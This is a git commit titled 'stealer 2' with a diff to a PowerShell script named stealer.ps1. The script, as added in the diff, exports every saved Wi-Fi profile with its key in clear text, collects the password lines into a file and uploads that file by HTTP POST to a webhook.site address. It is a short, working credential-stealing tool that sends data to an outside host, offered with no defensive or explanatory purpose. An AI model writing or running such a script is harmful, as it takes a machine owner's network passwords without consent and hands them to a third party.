de0fa2e6fdf3ad0695b37befd8a82f4db1cb12c1
lourdesbruna <80321812+lourdesbruna@users.noreply.github.com>
2022-12-06 12:47:29 +0100

    stealer 2

--- stealer.ps1
+++ stealer.ps1
@@ -1,4 +1,4 @@
 cd "$env:LOCALAPPDATA"
-netsh wlan export profile key=clear
-powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
-powershell Invoke-WebRequest -Uri https://webhook.site/1effb288-1ed1-40f4-a479-1e07b5fa764e -Method POST -InFile Wi-Fi-PASS
+netsh wlan export profile key=clear                                                         
+powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS                  
+powershell Invoke-WebRequest -InFile Wi-Fi-PASS -Uri https://webhook.site/1effb288-1ed1-40f4-a479-1e07b5fa764e -Method POST
